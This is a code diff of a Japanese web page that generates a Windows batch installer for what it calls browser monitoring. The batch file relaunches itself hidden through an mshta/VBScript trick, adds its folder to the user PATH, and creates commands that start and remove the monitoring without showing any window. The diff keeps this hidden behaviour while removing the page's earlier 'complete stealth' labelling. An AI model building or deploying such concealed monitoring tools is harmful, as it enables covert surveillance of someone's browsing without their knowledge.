@@ -2,39 +2,37 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>完全ステルス版 インストーラー</title>
+    <title>完全版 インストーラー</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; color: #333; }
         .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .btn { display: inline-block; padding: 15px 40px; font-size: 18px; font-weight: bold; color: #fff; background: #107c41; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; box-shadow: 0 4px 6px rgba(0,0,0,0.15); transition: background 0.2s; }
-        .btn:hover { background: #0b5931; }
-        .instructions { margin-top: 30px; text-align: left; background: #f9f9f9; padding: 20px; border-left: 4px solid #107c41; border-radius: 4px; font-size: 14px; line-height: 1.8; }
+        .btn { display: inline-block; padding: 15px 40px; font-size: 18px; font-weight: bold; color: #fff; background: #0078d7; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; box-shadow: 0 4px 6px rgba(0,0,0,0.15); transition: background 0.2s; }
+        .btn:hover { background: #005a9e; }
+        .instructions { margin-top: 30px; text-align: left; background: #f9f9f9; padding: 20px; border-left: 4px solid #0078d7; border-radius: 4px; font-size: 14px; line-height: 1.8; }
         code { background: #eef; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-weight: bold; color: #d0104c; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>完全ステルス・システムインストーラー</h2>
-    <p>下のボタンからダウンロードされるバッチファイルは、実行時も一切画面を表示しません。</p>
+    <h2>環境変数修正版 インストーラー</h2>
+    <p>下のボタンからダウンロードされるバッチは、管理者権限なしでユーザーPATHを確実に書き換えます。</p>
     
-    <button class="btn" onclick="downloadStealthSystem()">setup_system.bat を取得</button>
+    <button class="btn" onclick="downloadFixedSystem()">setup_system.bat を取得</button>
 
     <div class="instructions">
-        <strong>【完全ステルス運用の流れ】</strong><br>
-        1. ダウンロードした <code>setup_system.bat</code> を実行します。<br>
-        ※画面は一切出ず、裏で一瞬で設定が完了します（文字化けエラーも発生しません）。<br>
-        2. 反映のため、一度Windowsから<strong>サインアウトして再ログイン</strong>します。<br>
-        3. <code>Win</code> + <code>R</code> ➡️ <code>tsk</code> ➡️ <code>Enter</code> で<strong>ブラウザの監視が完全非表示で開始</strong>されます。<br>
-        4. 解除したい時は、<code>Win</code> + <code>R</code> ➡️ <code>un</code> ➡️ <code>Enter</code> を押します。<br>
-        ※アンインストーラーも<strong>一瞬すら画面を出さずに</strong>、監視停止とファイル・環境変数の完全消去を裏で行います。
+        <strong>【手順】</strong><br>
+        1. ダウンロードした <code>setup_system.bat</code> を実行します（一瞬裏で処理されます）。<br>
+        2. 反映のため、必ず一度Windowsから<strong>サインアウト（ログアウト）して再ログイン</strong>してください。<br>
+        3. 再ログイン後、<code>Win</code> + <code>R</code> ➡️ <code>tsk</code> ➡️ <code>Enter</code> で監視が始まります。<br>
+        4. 消去時は <code>Win</code> + <code>R</code> ➡️ <code>un</code> ➡️ <code>Enter</code> で全て元通りになります。
     </div>
 </div>
 
 <script>
-function downloadStealthSystem() {
-    // 文字化けの原因となる日本語メッセージ（echo）をすべて排除し、
-    // 実行時に一瞬で「自身を非表示モードで再起動する」処理を先頭に組み込みました。
+function downloadFixedSystem() {
+    // 確実性を高めるため、PowerShellの [Environment]::SetEnvironmentVariable を使用して
+    // ユーザー環境変数を直接、かつ安全に追加・削除するようにロジックを刷新しました。
     const batText = `@echo off\r\n` +
                     `if "%~1"=="h" goto :stealth\r\n` +
                     `mshta vbscript:CreateObject("Wscript.Shell").Run(chr(34)^&"%~f0"^&chr(34)^&" h",0)(window.close)\r\n` +
@@ -63,7 +61,7 @@ function downloadStealthSystem() {
                     `(echo @echo off\r\n` +
                     `echo start wscript.exe "%RUN_VBS%") > "%TSK_BAT%"\r\n` +
                     
-                    `:: 4. 完全非表示で解体する un.bat の作成（先頭で非表示化）\r\n` +
+                    `:: 4. 完全非表示で解体する un.bat の作成\r\n` +
                     `(echo @echo off\r\n` +
                     `echo if "%%~1"=="h" goto :unstealth\r\n` +
                     `echo mshta vbscript:CreateObject^("Wscript.Shell"^).Run^(chr^(34^)^&"%%~f0"^&chr^(34^)^&" h",0^)^(window.close^)\r\n` +
@@ -71,17 +69,13 @@ function downloadStealthSystem() {
                     `echo :unstealth\r\n` +
                     `echo taskkill /f /im cmd.exe /fi "WINDOWTITLE eq %LOOP_BAT%" ^>nul 2^>^&1\r\n` +
                     `echo taskkill /f /im wscript.exe ^>nul 2^>^&1\r\n` +
-                    `echo powershell -NoProfile -Command "[Environment]::SetEnvironmentVariable('PATH', [Environment]::GetEnvironmentVariable('PATH', 'User').Replace('%TARGET_DIR%;', '').Replace(';%TARGET_DIR%', ''), 'User')"\r\n` +
+                    `echo powershell -NoProfile -Command "$p = [Environment]::GetEnvironmentVariable('PATH', 'User'); $p = $p -replace [regex]::Escape('%TARGET_DIR%;'), ''; $p = $p -replace [regex]::Escape(';%TARGET_DIR%'), ''; [Environment]::SetEnvironmentVariable('PATH', $p, 'User')"\r\n` +
                     `echo del /f /q "%TSK_BAT%" "%LOOP_BAT%" "%RUN_VBS%" ^>nul 2^>^&1\r\n` +
                     `echo cd .. ^& rmdir /s /q "%TARGET_DIR%" ^>nul 2^>^&1\r\n` +
                     `echo del /f /q "%%~f0" ^>nul 2^>^&1) > "%UN_BAT%"\r\n` +
                     
-                    `:: 5. ユーザー環境変数 (PATH) への登録\r\n` +
-                    `for /f "tokens=2*" %%A in ('reg query "HKCU\\Environment" /v PATH 2^>nul') do set "OLD_PATH=%%B"\r\n` +
-                    `echo %OLD_PATH% | findstr /I /C:"%TARGET_DIR%" >nul\r\n` +
-                    `if %errorlevel% neq 0 (\r\n` +
-                    `    if "%OLD_PATH%"=="" (setx PATH "%TARGET_DIR%" >nul) else (setx PATH "%OLD_PATH%;%TARGET_DIR%" >nul)\r\n` +
-                    `)\r\n`;
+                    `:: 5. PowerShellを使用してユーザーPATHへ確実に追加\r\n` +
+                    `powershell -NoProfile -Command "$p = [Environment]::GetEnvironmentVariable('PATH', 'User'); if($p -notlike '*%TARGET_DIR%*'){ if($p -eq '' -or $p -eq $null){ $p = '%TARGET_DIR%' }else{ $p = $p + ';%TARGET_DIR%' }; [Environment]::SetEnvironmentVariable('PATH', $p, 'User') }"\r\n`;
 
     const blob = new Blob([batText], { type: "text/plain" });
     const link = document.createElement("a");
